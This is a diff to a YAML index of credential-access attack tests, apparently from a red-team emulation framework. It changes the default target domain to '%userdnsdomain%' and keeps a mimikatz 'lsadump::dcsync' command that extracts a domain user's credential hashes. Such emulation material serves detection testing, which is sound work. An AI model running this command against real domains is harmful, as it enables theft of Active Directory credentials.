@@ -1618,7 +1618,7 @@ credential-access:
         domain:
           description: Targeted Active Directory domain
           type: String
-          default: example.com
+          default: "%userdnsdomain%"
         user:
           description: Targeted user
           type: String
@@ -1647,7 +1647,9 @@ credential-access:
         name: command_prompt
         elevation_required: false
         command: '#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"
-          "exit"'
+          "exit"
+
+'
   T1556.001:
     technique:
       external_references:
@@ -2148,7 +2150,7 @@ credential-access:
         domain:
           description: Targeted Active Directory domain FQDN
           type: String
-          default: example.com
+          default: "%userdnsdomain%"
         account:
           description: Account to impersonate
           type: String
